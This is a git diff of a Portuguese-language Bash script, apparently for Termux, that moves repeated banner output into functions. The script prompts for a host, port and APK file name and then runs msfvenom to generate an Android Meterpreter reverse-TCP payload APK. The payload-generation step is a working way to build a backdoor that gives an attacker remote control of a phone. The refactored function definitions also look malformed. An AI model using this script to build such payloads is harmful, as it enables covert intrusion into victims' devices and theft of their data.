@@ -19,6 +19,7 @@ function dependencias() {
     
     command -v metasploit > /dev/null 2>&1 || { echo >&2 "você não tem o metasploit instalado, instale para continuar"; exit 1; }
 }
+function banner
 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mAutor: Senhor-Loock\e[0m\n"
 
@@ -26,34 +27,31 @@ printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mEdited by:0x0a λ\e[0
 
 cowsay -f eyes "Hacking" | lolcat
 figlet -f slant "FERRAMENTAS" | lolcat
-
+banner
+}
+function script(){
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mlocalhost [H]:" 
   read host
 
 clear
-
-cowsay -f eyes "Hacking" | lolcat
-figlet -f slant "FERRAMENTAS" | lolcat
+banner
 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mport [P]:\e[0m\n" 
    read port
 
 clear
-
-cowsay -f eyes "Hacking" | lolcat
-figlet -f slant "FERRAMENTAS" | lolcat
+banner
 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mNome do apk:Exemplo paylaod.apk:\e[0m\n" 
    read name
 
 clear
-
-cowsay -f eyes "Hacking" | lolcat
-figlet -f slant "FERRAMENTAS" | lolcat
+banner
 
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93mCriando $name\e[0m\n"
 
 msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> /data/data/com.termux/files/home/storage/downloads/$name
+}
 
-
+banner
 dependencias
